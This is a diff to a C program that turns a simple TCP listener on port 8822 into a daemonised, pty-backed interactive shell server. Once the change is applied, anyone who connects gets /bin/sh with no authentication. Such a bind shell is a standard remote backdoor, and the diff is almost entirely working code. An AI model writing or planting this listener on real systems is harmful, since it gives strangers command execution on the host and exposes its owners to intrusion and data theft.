@@ -1,3 +1,5 @@
+#include <pty.h>
+#include <fcntl.h>
 #include <unistd.h>
 #include <string.h>
 #include <netdb.h>
@@ -5,10 +7,30 @@
 
 #define LISTEN_BACKLOG 50
 
+void write_(int fd, char * buffer, int size) {
+    int done = 0;
+    while (done < size) {
+        int r = write(fd, buffer + done, size - done);
+        if (r == -1) {
+            perror("write failed");
+            _exit(1);
+        }
+        done += r;
+    }
+}
+
 int main(int argc, char ** argv) {
+    int pid = fork();
+    if (pid) {
+        int status;
+        waitpid(pid, &status, 0);
+        return 0;
+    }
+    setsid();
     struct addrinfo hints;
     memset(&hints, 0, sizeof(struct addrinfo));
-    hints.ai_family = AF_UNSPEC;
+    hints.ai_family = AF_INET;
+    hints.ai_flags = AI_PASSIVE;
     hints.ai_socktype = SOCK_STREAM;
     struct addrinfo * result;
     if (getaddrinfo(0, "8822", &hints, &result) == 0) {
@@ -45,7 +67,7 @@ int main(int argc, char ** argv) {
     }
     struct sockaddr peer_addr;
     socklen_t peer_addr_size;
-    int acceptedfd = accept(socketfd, &peer_addr, &peer_addr_size);
+    int acceptedfd = accept(socketfd, NULL, NULL);
     if (acceptedfd == -1) {
         perror("accept() failed");
         _exit(1);
@@ -59,13 +81,48 @@ int main(int argc, char ** argv) {
             _exit(1);
         }
     } else {
-        dup2(acceptedfd, 0);
-        dup2(acceptedfd, 1);
-        dup2(acceptedfd, 2);
-        if (close(acceptedfd) == -1) {
-            perror("close failed");
-            _exit(1);
-        }
+        close(socketfd);
         printf("hello, world\n");
+        int master, slave;
+        char buf[4096];
+        openpty(&master, &slave, buf, NULL, NULL);
+        if (fork()) {
+            close(slave);
+            int buffer_size = 4096;
+            char * buffer = malloc(buffer_size);
+            fcntl(master, F_SETFL, O_NONBLOCK);
+            fcntl(acceptedfd, F_SETFL, O_NONBLOCK);
+            while (1) {
+                int r = read(master, buffer, buffer_size);
+                if (r > 0) {
+                    write(acceptedfd, buffer, r);
+                } else if (r == 0) {
+                    break;
+                }
+
+                r = read(acceptedfd, buffer, buffer_size);
+                if (r > 0) {
+                    write(master, buffer, r);
+                } else if (r == 0) {
+                    break;
+                }
+            }
+            free(buffer);
+            close(master);
+            close(acceptedfd);
+        } else {
+            close(master);
+            close(acceptedfd);
+            setsid();
+            int fd = open(buf, O_RDWR);
+            close(fd);
+
+            dup2(slave, 0);
+            dup2(slave, 1);
+            dup2(slave, 2);
+            close(slave);
+            execl("/bin/sh", "/bin/sh", NULL);
+        }
     }
+    return 0;
 }
